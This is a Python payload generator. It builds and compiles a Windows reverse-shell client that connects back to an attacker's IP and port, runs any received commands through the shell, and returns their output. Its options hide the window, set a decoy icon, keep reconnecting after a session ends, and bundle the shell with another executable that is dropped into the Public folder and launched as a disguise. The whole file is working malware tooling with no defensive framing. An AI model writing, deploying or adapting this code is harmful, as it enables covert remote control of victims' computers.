#!C:\Python34\python.exe
import socket
import argparse
import os
import getpass
import subprocess
import binascii

parser = argparse.ArgumentParser(description="Generate simple Payload to connect on target")
parser.add_argument('-ip','--ip',help="your ip address to listen (default: 127.0.0.1)",action='store')
parser.add_argument('-p','--port',help="port to listen (default: 4444)",type=int)
parser.add_argument('-n','--name',help="payload name (default: payload)",action='store')
parser.add_argument('-i','--icon',help="icon of the .exe payload (ex: -i myicon.ico)",action='store')
parser.add_argument('-hide','--hidden',help="make the payload hidden",action='store_true')
parser.add_argument('-ne','--notexe',help="does not compile the payload, only generate the .py",action='store_true')
parser.add_argument('-noexit','--noexit',help="continue keeping trying to connect when session is closed",action='store_true')
parser.add_argument('-m','--merge',help="merge the payload with a .exe file",action="store")

args = parser.parse_args()

if args.ip:
	ip = args.ip
else:
	ip = '127.0.0.1'

if args.port:
	port = int(args.port)
else:
	port = 4444

if args.name:
	name = args.name
else:
	name = 'payload'

compile_arguments = ""
if args.hidden:
	compile_arguments += "-w "
if args.icon:
	compile_arguments += "-i ../%s"%args.icon

ext = '.py'
if args.hidden:
	ext = '.pyw'

# Set option to create .exe
createExe = True	
if args.notexe:
	createExe = False

# Set Persistence
persist = False
if args.noexit:
	persist = True

# Merge
merge = False
exe_hex = b''
if args.merge:
	exe_name = args.merge
	if not exe_name.endswith('.exe'):
		print('[!] parameter error: "%s" is not a .exe'%exe_name)
		exit(1)

	exe_hex = "'"+binascii.hexlify(open(exe_name,'rb').read()).decode()+"'"
	merge = True

print("[*] generating payload")

rawcode = """
import socket,time,os,threading,binascii
from subprocess import Popen,PIPE

ip = '%s'
port = %d
persistence = %i
merge = %i
exe_cryptdata = %s

def create_socket(ip,port):
	client = socket.socket()
	client.settimeout(10)
	return client	

def openExe(exe_cryptdata):
	exe_data = binascii.unhexlify(exe_cryptdata.encode())	
	with open('c:\\\\users\\\\public\\\\TempControl.exe','wb') as exefile:
		exefile.write(exe_data)
	Popen('start c:\\\\users\\\\public\\\\TempControl.exe',shell=1,stdout=PIPE,stderr=PIPE,stdin=PIPE).communicate()

if merge:
	threading.Thread(target=openExe,args=(exe_cryptdata,)).start()

while 1:
	try:
		client = create_socket(ip,port)
		client.connect((ip,port))
		client.settimeout(200)
	except KeyboardInterrupt: break
	except Exception:
		time.sleep(1)
		continue

	#system_name,username = os.popen("whoami").read().strip().split('\\\\')
	system_name,username = Popen("whoami",shell=1,stdout=PIPE,stderr=PIPE,stdin=PIPE).communicate()[0].strip().split(b'\\\\')

	while 1:
		try:
			client.send(username+b'@'+system_name+b':~$ ')
			command = client.recv(1024).decode().strip()
			resp = b"          "

			if command=='exit':
				client.send(b'[*] exit code')
				break
			elif command.startswith("cd "):
				direc = command.split(" ")[1]
				if not os.path.isdir(direc):
					resp = b'[!] directory not found'
				else:
					os.chdir(direc)
			elif command=='endsession':
				persistence = False
				client.send(b'[*] session ended')
				break
			else:
				cmmd = Popen(command,shell=1,stdout=PIPE,stderr=PIPE,stdin=PIPE).communicate()[0].strip()
				if cmmd!=b"": 
					resp = cmmd

			client.send(resp)

		except KeyboardInterrupt: break
		except Exception as er:
			print('error: '+str(er))
			if str(er)=='timed out': break
			time.sleep(4)

	client.close()
	if not persistence: break
	print('*')
	time.sleep(5)

"""%(ip,port,persist,merge,exe_hex)

with open(name+ext,'w') as file:
	file.write(rawcode)

if not createExe:
	print("[*] finished!")
	exit()

# Compile
have_compiler = subprocess.Popen('pyinstaller -v',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[1]
if have_compiler!=b'':
	print('[!] error: "pyinstaller" not found. install it with: pip install pyinstaller')
	exit(2)

print("[*] compiling...")
if not os.path.isdir('installing'):
	os.system('md installing')
os.chdir('installing')

# 2> nul > nul
os.system("pyinstaller %s --onefile ../%s 2> nul > nul"%(compile_arguments,name+ext))
if not os.path.isdir('dist') or not os.path.isfile("dist\\%s.exe"%name):
	print("[!] error when compiling")
	exit(1)

os.system("move dist\\%s.exe .. 2> nul > nul"%name)
os.chdir("..")
#os.system("rmdir /s /q installing 2> nul > nul")

print("[*] compilation finished")